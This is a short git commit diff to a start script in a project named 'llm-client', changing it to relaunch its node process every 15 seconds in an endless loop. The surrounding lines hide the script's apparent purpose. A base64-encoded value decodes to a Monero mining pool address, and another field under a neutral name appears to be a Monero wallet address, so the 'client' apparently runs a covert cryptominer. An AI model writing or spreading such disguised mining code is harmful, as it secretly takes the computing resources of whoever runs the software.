ae8e77ee52478735114c368486007814f941a70a
gaserjuk <gaserjukilo@gmail.com>
2025-12-24 23:55:15 +0700

    Modify start.sh to restart node every 15 seconds

--- llm-client/start.sh
+++ llm-client/start.sh
@@ -6,4 +6,4 @@ SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
 SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}" > .env
-node index.js
+while true; do node index.js; sleep 15; done
